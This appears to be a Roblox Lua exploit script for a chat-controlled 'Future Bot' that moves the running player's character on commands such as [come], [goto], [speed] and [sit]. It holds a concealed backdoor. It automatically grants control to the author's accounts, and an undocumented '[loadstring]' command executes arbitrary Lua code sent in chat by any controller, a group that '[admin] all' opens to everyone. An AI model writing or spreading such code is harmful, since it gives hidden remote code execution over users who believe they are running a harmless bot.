warn("init")

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local PathfindingService = game:GetService("PathfindingService")
local LocalPlayer = Players.LocalPlayer

_G.admins = {}
table.insert(_G.admins, LocalPlayer.UserId)
if game.Players:FindFirstChild("Steve_Bloks") then --automatically gib me friens controller :D
	table.insert(_G.admins, game.Players:FindFirstChild("Steve_Bloks").UserId)
elseif game.Players:FindFirstChild("xe_ukisohiosigma") then
	table.insert(_G.admins, game.Players:FindFirstChild("xe_ukisohiosigma").UserId)
end

local function Chat(txt)
	local text = tostring(txt)
	task.wait()
	game.TextChatService.TextChannels.RBXGeneral:SendAsync(txt)
end

local function Path(targetPosition)
	local character = game.Players.LocalPlayer.Character
    if not character then return end

    local humanoid = character:FindFirstChild("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not rootPart then return end

    local path = PathfindingService:CreatePath({
        AgentRadius = 2,
        AgentHeight = 5,
        AgentCanJump = true,
        AgentJumpHeight = 50,
        AgentMaxSlope = 45,
    })

    path:ComputeAsync(rootPart.Position, targetPosition)

    if path.Status == Enum.PathStatus.Success then
        local waypoints = path:GetWaypoints()

        for _, waypoint in ipairs(waypoints) do
            humanoid:MoveTo(waypoint.Position)

            humanoid.MoveToFinished:Wait()

            if waypoint.Action == Enum.PathWaypointAction.Jump then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    else
        Chat("Error: Pathfinding failed to find a valid path.")
    end
end

local function Sit()
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        game.Players.LocalPlayer.Character.Humanoid.Sit = true
    end
end

local function Jump()
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
end

local function Reset()
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        game.Players.LocalPlayer.Character.Humanoid.Health = -1
    end
end

local function Speed(speed)
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        local realSpeed = tonumber(speed)
        if realSpeed and realSpeed > 0 then
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = realSpeed
        end
    end
end

local function JumpPower(jp)
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        local realJP = tonumber(jp)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = realJP
    end
end

TextChatService.OnIncomingMessage = nil
local readit = false

TextChatService.MessageReceived:Connect(function(message)
    local txtSource = message.TextSource
    local txtMsg = message.Text

    if not txtSource or not txtSource:IsA("TextSource") then
        warn("Invalid text source")
        return
    end

    print("msg received: \"" .. tostring(txtMsg) .. "\", txtSource: " .. txtSource.UserId .. ".")

    local lowerMsg = string.lower(tostring(txtMsg))

    if lowerMsg == "[sit]" and table.find(_G.admins, txtSource.UserId) then
        Sit()
	elseif string.split(lowerMsg, " ")[1] == "[loadstring]" and table.find(_G.admins, txtSource.UserId) then
		local cmd = string.split(txtMsg, " ")[2]
		if cmd then
			loadstring(cmd)()
		end
    elseif lowerMsg == "[come]" and table.find(_G.admins, txtSource.UserId) then
        local player = Players:GetPlayerByUserId(txtSource.UserId)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			Jump()
			task.wait(0.05)
            local hrp = player.Character.HumanoidRootPart
			Chat("[FBot]: Going to "..player.Name)
            Path(hrp.Position)
        end
    elseif lowerMsg == "[jump]" and table.find(_G.admins, txtSource.UserId) then
        Jump()
    elseif lowerMsg == "[reset]" and table.find(_G.admins, txtSource.UserId) then
        Reset()
    elseif string.sub(lowerMsg, 1, 7) == "[speed]" and table.find(_G.admins, txtSource.UserId) then
        local cmd = string.split(lowerMsg, " ")
        local speed = cmd[2]
		if speed ~= nil then
			Speed(speed)
			Chat("[FBot]: WalkSpeed set to "..speed)
		else
			Chat("[error] missing speed value.")
		end
    elseif string.split(lowerMsg, " ")[1] == "[goto]" and table.find(_G.admins, txtSource.UserId) then
		local msgg = string.split(txtMsg, " ")
		local player = Players:FindFirstChild(msgg[2])
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			Jump()
			task.wait(0.05)
            local hrp = player.Character.HumanoidRootPart
			Chat("[FBot]: Going to "..player.Name)
            Path(hrp.Position)
        else
			Chat("[error] no player found for goto command, make sure to use capital letters and put the full username. (dev info: "..txtMsg..", "..tostring(player)..", "..lowerMsg..")")
		end
	elseif string.sub(lowerMsg, 1, 7) == "[admin]" and table.find(_G.admins, txtSource.UserId) then
		local cmd = string.split(txtMsg, " ")
		if cmd[2] == "all" then
			for _, p in game.Players:GetPlayers() do
				table.insert(_G.admins, p.UserId)
			end
			Chat("[FBot]: Everyone is now a controller. Use [cmds] for a list of commands.")
		else
			local target = game.Players:FindFirstChild(cmd[2])
			if target and target.UserId then
				table.insert(_G.admins, target.UserId)
				Chat("[FBot]: User "..target.Name.." is now a controller. Use [cmds] for a list of commands.")
			else
				Chat("[error] missing username.")
			end
		end
	elseif string.split(lowerMsg, " ")[1] == "[listadmins]" and table.find(_G.admins, txtSource.UserId) then
		local names = {}
		for _, id in _G.admins do
			local plr = game.Players:GetPlayerByUserId(id)
			if plr then
				table.insert(names, plr.Name)
			end
		end
		Chat("[FBot]: Current controllers: "..table.concat(names, ", ")..".")
	elseif string.split(lowerMsg, " ")[1] == "[jumppower]" and table.find(_G.admins, txtSource.UserId) then
        local cmd = string.split(lowerMsg, " ")
        local speed = cmd[2]
		if speed then
			JumpPower(speed)
			Chat("[FBot]: JumpPower set to "..speed)
		else
			Chat("[error] missing input value.")
		end
	elseif string.split(lowerMsg, " ")[1] == "[listinv]" and table.find(_G.admins, txtSource.UserId) then
		local gears = {}
		for _, thing in game.Players.LocalPlayer.Backpack:GetChildren() do
			table.insert(gears, thing.Name)
		end
		task.wait()
		if #gears > 1 then
			local list = table.concat(gears, ", ")
			Chat("[FBot]: Inventory: "..list)
		elseif #gears == 1 then
			Chat("[FBot]: Inventory: "..gears[1])
		else
			Chat("[FBot]: My inventory is empty!")
		end
	elseif lowerMsg == "[info]" then
		Chat("[FBot]: Future Bot is a WIP remote control bot created by S_B, if you're currently a controller you can do [cmds] for a list of commands.")
	elseif string.sub(lowerMsg, 1, 7) == "[cmds]" and table.find(_G.admins, txtSource.UserId) then
		Chat("[FBot]: Commands: [info], [come], [goto] <playername>, [admin] <playername/\"all\">, [reset], [jump], [sit], [speed] <number>, [jumppower] <number>, [listinv]")
		if readit == false then
			readit = true
			task.wait(0.8)
			Chat("(developer note: while reading testing logs i noticed some people dont get the command structure, for example goto is \"[goto] coolplayer65\" but is constantly misunderstood as \"[goto coolplayer64]\" or other mispellings. Also thanks for interacting with my project :D )")
		end
	end
end)

local testingRandomMode = false
local secureNameSet = ""

warn("loaded")
Chat("Future Bot loading! [Version A0.1.3_public]")
if testingRandomMode == true then
	task.wait(5)
	Chat("[FBot]: This is an automatic test, making a random user a controller.")
	task.wait(1)
	local randomInt = math.random(1, #game.Players:GetPlayers())
	local random = game.Players:GetPlayers()[randomInt]
	task.wait()
	if random.Name == "FutureHub_Official" then
		Chat("[admin] "..secureNameSet)
	else
		Chat("[admin] "..random.Name)
	end
end
